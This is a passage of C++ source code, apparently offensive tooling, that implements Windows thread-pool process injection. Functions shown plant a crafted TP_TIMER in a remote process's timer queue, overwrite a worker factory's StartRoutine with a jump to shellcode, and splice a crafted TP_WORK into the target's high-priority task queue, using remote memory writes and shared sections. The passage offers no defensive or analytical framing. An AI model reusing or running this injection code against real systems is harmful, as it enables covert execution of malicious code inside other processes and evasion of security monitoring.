    if (!NT_SUCCESS(StTpTimerCreate)) {
        cerr << "[-]Failed to create Sectiom for TpTimer 0x" << hex << StTpTimerCreate << endl;
        free(pTpTimer);
        return FALSE;
    }
    NTSTATUS StLocalTimerMap = pNtMapViewOfSection(hTpTimerSection, GetCurrentProcess(), &LocalTpTimerAddress, NULL, NULL, NULL, &TpTimerSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(StLocalTimerMap)) {
        cerr << "[-]Failed to Map in Local Process 0x" << hex << StLocalTimerMap << endl;
        CloseHandle(hTpTimerSection);
        free(pTpTimer);
        return FALSE;
    }
    NTSTATUS StRemoteTimerMap = pNtMapViewOfSection(hTpTimerSection, hProcess, &RemoteTpTimerAddress, NULL, NULL, NULL, &TpTimerSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(StRemoteTimerMap)) {
        cerr << "[-]Failed to Map in Remote Process 0x" << hex << StRemoteTimerMap << endl;
        CloseHandle(hTpTimerSection);
        free(pTpTimer);
        return FALSE;
    }
    PFULL_TP_TIMER ConvertedRemoteTpTimerAddress = (PFULL_TP_TIMER)RemoteTpTimerAddress;
    cout << "[!]Convert " << ConvertedRemoteTpTimerAddress << " Org " << RemoteTpTimerAddress << endl;
    const auto Timeout = -10000000;
    pTpTimer->Work.CleanupGroupMember.Pool = (PFULL_TP_POOL)WorkerBasicInfo.StartParameter;
    pTpTimer->DueTime = Timeout;
    pTpTimer->WindowStartLinks.Key = Timeout;
    pTpTimer->WindowEndLinks.Key = Timeout;
    pTpTimer->WindowStartLinks.Children.Flink = &ConvertedRemoteTpTimerAddress->WindowStartLinks.Children;
    pTpTimer->WindowStartLinks.Children.Blink = &ConvertedRemoteTpTimerAddress->WindowStartLinks.Children;
    pTpTimer->WindowEndLinks.Children.Flink = &ConvertedRemoteTpTimerAddress->WindowEndLinks.Children;
    pTpTimer->WindowEndLinks.Children.Blink = &ConvertedRemoteTpTimerAddress->WindowEndLinks.Children;
    memcpy(LocalTpTimerAddress, pTpTimer, TpTimerSize);
    //NTSTATUS StWriteTpTimer = pNtWriteVirtualMemory(GetCurrentProcess(), LocalTpTimerAddress, pTpTimer, TpTimerSize, NULL);
    cout << "[!]Mapped the crafted TpTimer Structure to Remote Process." << endl;

    auto TpTimerWindowStartLinks = &ConvertedRemoteTpTimerAddress->WindowStartLinks;
    auto TpTimerWindowEndLinks = &ConvertedRemoteTpTimerAddress->WindowEndLinks;
    NTSTATUS StWriteWindowStart = pNtWriteVirtualMemory(hProcess, &pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root, &TpTimerWindowStartLinks, sizeof(TpTimerWindowStartLinks), NULL);
    cout << "[!]Write Window Start 0x" << hex << StWriteWindowStart << endl;
    NTSTATUS StWriteWindowEnd = pNtWriteVirtualMemory(hProcess, &pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, &TpTimerWindowEndLinks, sizeof(TpTimerWindowEndLinks), NULL);
    cout << "[!]Write Window End 0x" << hex << StWriteWindowEnd << endl;
    cout << "[!]Modified the target process's TP_POOL tiemr queue WindowsStart and WindowsEnd to point to the specially crafted TP_TIMER." << endl;

    LARGE_INTEGER DueTime = { 0 };
    DueTime.QuadPart = Timeout;
    T2_SET_PARAMETERS Parameters = { 0 };
    pNtSetTimer2(hIRTimer, &DueTime, NULL, &Parameters);
    cout << "[!]Set the timer queue to expire to trigger the dequeueing TppTimerQueueExpiration" << endl;
    CloseHandle(hTpTimerSection);
    free(pTpTimer);
    return TRUE;
}

//RemapFailed 0xC0000220 STATUS_MAPPED_ALIGNMENT
//half success
BOOL StartRoutineOverwrite(PVOID shellcodeaddress, HANDLE hProcess, HANDLE hWorkerFactory) {
    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
    NTSTATUS StQueryWFBInfo = pNtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
    if (!NT_SUCCESS(StQueryWFBInfo)) {
        cerr << "[-]Failed to retrieve Worker basic info 0x" << hex << StQueryWFBInfo << endl;
        return FALSE;
    }
    PVOID StartRoutine = WorkerFactoryInformation.StartRoutine;
    cout << "[+]StartRoutine Address is " << StartRoutine << endl;

    DWORD JMPSize = 12;
    uint8_t* JmpImage=new(uint8_t[JMPSize]);
    memset(JmpImage, 0x90, 12);
    JmpImage[0] = 0x48;
    JmpImage[1] = 0xB8;
    *(uintptr_t*)(JmpImage + 2) = (uintptr_t)shellcodeaddress;
    JmpImage[10] = 0xFF;
    JmpImage[11] = 0xE0;
    /*
    LARGE_INTEGER secsize = { 16 };
    SIZE_T MapSize = 16;
    HANDLE sechandle = NULL;
    PVOID secaddress = NULL;
    NTSTATUS StJmpImage = pNtCreateSection(&sechandle, SECTION_ALL_ACCESS, NULL, &secsize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(StJmpImage)) {
        cerr << "[-]Failed to Create JMP section. 0x" << hex << StJmpImage << endl;
        return FALSE;
    }
    NTSTATUS StLocalProcMap = pNtMapViewOfSection(sechandle, GetCurrentProcess(), &secaddress, NULL, NULL, NULL, &MapSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(StLocalProcMap)) {
        cerr << "[-]Failed to Map JMP image in current process. 0x" << hex << StLocalProcMap << endl;
        CloseHandle(sechandle);
        return FALSE;
    }
    memcpy(secaddress, JmpImage, 12);
    secaddress = StartRoutine;
    NTSTATUS StRemoteUnmap = pNtUnmapViewOfSection(hProcess, secaddress);
    if (!NT_SUCCESS(StRemoteUnmap)) {
        cerr << "[-]Failed to Unmap Remote WF StartRoutine. 0x" << hex << StRemoteUnmap << endl;
        CloseHandle(sechandle);
        return FALSE;
    }
    NTSTATUS StRemoteMap = pNtMapViewOfSection(sechandle, hProcess, &secaddress, NULL, NULL, NULL, &MapSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(StRemoteMap)) {
        cerr << "[-]Failed to Remap StartRoutine 0x" << hex << StRemoteMap << endl;
        CloseHandle(sechandle);
        return FALSE;
    }
    CloseHandle(sechandle);
    */
    //*
    DWORD OldProtect = 0;
    if (!VirtualProtectEx(hProcess, StartRoutine, JMPSize, PAGE_EXECUTE_READWRITE, &OldProtect)) {
        cerr << "[-]Failed to Change StartRoutine Protection state. " << GetLastError() << endl;
        return FALSE;
    }
    NTSTATUS StWriteOpcode = pNtWriteVirtualMemory(hProcess, StartRoutine, JmpImage, JMPSize, NULL);
    if (!NT_SUCCESS(StWriteOpcode)) {
        cerr << "[-]Failed to write OpCode to StartRoutine. 0x" << hex << StWriteOpcode << endl;
        return FALSE;
    }
    //*/
    delete[] JmpImage;
    cout << "[!]Overwrite StartRoutine Complete!" << endl;

    ULONG WorkerFactoryMinimumThreadNumber = WorkerFactoryInformation.TotalWorkerCount + 1;
    NTSTATUS StSetWFINfo = pNtSetInformationWorkerFactory(hWorkerFactory, WorkerFactoryThreadMinimum, &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));
    if (!NT_SUCCESS(StSetWFINfo)) {
        cerr << "[-]Failed to Set WF INFO 0x" << hex << StSetWFINfo << endl;
        return FALSE;
    }
    cout << "[+]Set WF ThreadMinium Success!" << endl;
    return TRUE;
}

//Success ?
BOOL TpWorkInsert(PVOID shellcodeaddress, HANDLE hProcess, HANDLE hWorkerFactory) {
    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
    NTSTATUS StQueryWFBInfo = pNtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
    if (!NT_SUCCESS(StQueryWFBInfo)) {
        cerr << "[-]Failed to retrieve Worker basic info 0x" << hex << StQueryWFBInfo << endl;
        return FALSE;
    }

    SIZE_T BufferSize = sizeof(FULL_TP_POOL);
    PFULL_TP_POOL Buffer = new(FULL_TP_POOL[BufferSize]);
    SIZE_T BytesRead = 0;
    if (!ReadProcessMemory(hProcess, WorkerFactoryInformation.StartParameter, Buffer, BufferSize, &BytesRead)) {
        cerr << "[-]Failed to retrieve target TP_POOL " << GetLastError() << endl;
        return FALSE;
    }//Attention for &Buffer and &Buffer.get()
    if (BytesRead != BufferSize) {
        cerr << "[!]BytesRead is not match BufferSize" << endl;
    }
    PFULL_TP_POOL TargetTpPool = Buffer;
    cout << "[+]Read Target TP_POOL Structure into current Process." << endl;
    
    auto TargetTaskQueueHighPriorityList = &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;//Not the pointer
    cout << "[+]TargetTaskQueueHighPriorityList is set." << endl;
    PFULL_TP_WORK pTpWork = (PFULL_TP_WORK)CreateThreadpoolWork((PTP_WORK_CALLBACK)shellcodeaddress, nullptr, nullptr);
    if (pTpWork == NULL) {
        cerr << "[-]Failed to create TpWork associated to shellcode " << GetLastError() << endl;
        return FALSE;
    }
    cout << "[+]Created TpWork Associated to shellcode." << endl;

    pTpWork->CleanupGroupMember.Pool = (PFULL_TP_POOL)(WorkerFactoryInformation.StartParameter);
    pTpWork->Task.ListEntry.Flink = TargetTaskQueueHighPriorityList;
    pTpWork->Task.ListEntry.Blink = TargetTaskQueueHighPriorityList;
    pTpWork->WorkState.Exchange = 0x2;
    cout << "[+]Modified TpWork Structure associated with target process's TpPool." << endl;

    HANDLE hTpWorkSection = NULL;
    SIZE_T TpWorkSize = sizeof(FULL_TP_WORK);
    LARGE_INTEGER TpWorkSectionSize = { TpWorkSize };
    PVOID LocalTpWorkAddress = NULL, RemoteTpWorkAddress = NULL;
    NTSTATUS StTpWorkSec = pNtCreateSection(&hTpWorkSection, SECTION_ALL_ACCESS, NULL, &TpWorkSectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(StTpWorkSec)) {
        cerr << "[-]Failed to Create Section for TpWork. 0x" << StTpWorkSec << endl;
        return FALSE;
    }
    NTSTATUS StLocalTpWorkMap = pNtMapViewOfSection(hTpWorkSection, GetCurrentProcess(), &LocalTpWorkAddress, NULL, NULL, NULL, &TpWorkSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(StLocalTpWorkMap)) {
        cerr << "[-]Failed to map TpWork in current process. 0x" << hex << StLocalTpWorkMap << endl;
        CloseHandle(hTpWorkSection);
        return FALSE;
    }
    NTSTATUS StRemoteTpWorkMap = pNtMapViewOfSection(hTpWorkSection, hProcess, &RemoteTpWorkAddress, NULL, NULL, NULL, &TpWorkSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(StRemoteTpWorkMap)) {
        cerr << "[-]Failed to map remote TpWork 0x" << hex << StRemoteTpWorkMap << endl;
        CloseHandle(hTpWorkSection);
        return FALSE;
    }
    memcpy(LocalTpWorkAddress, pTpWork, TpWorkSize);
    cout << "[!]Crafted TpWork is written to " << RemoteTpWorkAddress << " in target process." << endl;
    CloseHandle(hTpWorkSection);

    PFULL_TP_WORK pRemoteTpWork = (PFULL_TP_WORK)RemoteTpWorkAddress;
    auto RemoteWorkItemTaskList = &pRemoteTpWork->Task.ListEntry;
    NTSTATUS FlinkQueueStat = pNtWriteVirtualMemory(hProcess, &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), NULL);
    if (!NT_SUCCESS(FlinkQueueStat)) {
        cerr << "[-]Failed to Queue Flink 0x" << hex << FlinkQueueStat << endl;
        return FALSE;
    }
    NTSTATUS BlinkQueueStat = pNtWriteVirtualMemory(hProcess, &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), NULL);
    if (!NT_SUCCESS(BlinkQueueStat)) {
        cerr << "[-]Failed to Queue Blink 0x" << hex << BlinkQueueStat << endl;
        return FALSE;
    }
    cout << "[!]Modified the target process's TP_POOL task queue list entry to point to the specially crafted TP_WORK" << endl;
    return TRUE;
}